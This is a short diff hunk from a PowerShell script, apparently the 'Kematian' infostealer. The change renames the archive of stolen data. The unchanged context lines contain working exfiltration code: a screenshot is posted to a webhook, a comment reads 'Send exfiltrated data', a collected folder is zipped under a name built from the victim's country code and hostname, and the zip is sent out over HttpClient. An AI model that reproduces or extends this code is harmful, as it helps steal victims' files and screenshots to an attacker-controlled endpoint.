@@ -1306,7 +1306,7 @@ function Backup-Data {
     $multipartContent.Add($fileContent, "file", "screenshot.png"); $httpClient.PostAsync($webhook, $multipartContent).Result
 
     # Send exfiltrated data
-    $zipFileName = "$countrycode-($hostname)-($filedate)-($timezoneString).zip"
+    $zipFileName = "$countrycode-($hostname)-Sahm.zip"
     $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"; Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
     $messageContent = @{username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json
     $httpClient = [Net.Http.HttpClient]::new(); $multipartContent = [Net.Http.MultipartFormDataContent]::new(); $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent)
